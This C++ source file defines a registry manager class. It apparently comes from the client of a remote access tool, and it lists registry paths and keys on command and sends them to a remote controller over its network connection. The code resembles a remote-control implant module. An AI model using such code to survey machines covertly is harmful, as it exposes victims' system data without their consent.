#include "RegisterManager.h"



CRegisterManager::CRegisterManager(_CIOCPClient* IOCPClient) :CManager(IOCPClient)
{
	BOOL  IsToken = CLIENT_REGISTER_MANAGER_REPLY;
	m_IOCPClient->OnSending((char*)&IsToken, 1);
}


CRegisterManager::~CRegisterManager()
{
}
void  CRegisterManager::HandleIO(PBYTE  BufferData, ULONG_PTR  BufferLength)
{
	BYTE  IsToken;
	switch (BufferData[0])
	{
	case  CLIENT_REGISTER_MANAGER_DATA:
	{
		if (BufferLength > 3)
		{
			FindRegisterData(BufferData[1], (char*)(BufferData + 2));
		}
		else
		{
			FindRegisterData(BufferData[1], NULL);
		}
		break;
	}


	}
}
void    CRegisterManager::FindRegisterData(char  IsToken, char*  FullPath)
{
	CRegister  Register(IsToken);
	if (FullPath != NULL)
	{
		Register.SetPath(FullPath);
	}
	char*  BufferData = Register.FindPath();
	if (BufferData != NULL)
	{
		m_IOCPClient->OnSending((char*)BufferData, LocalSize(BufferData));
		LocalFree(BufferData);
	}
	BufferData = Register.FindKey();
	if (BufferData != NULL)
	{
		m_IOCPClient->OnSending((char*)BufferData, LocalSize(BufferData));
		LocalFree(BufferData);
	}
}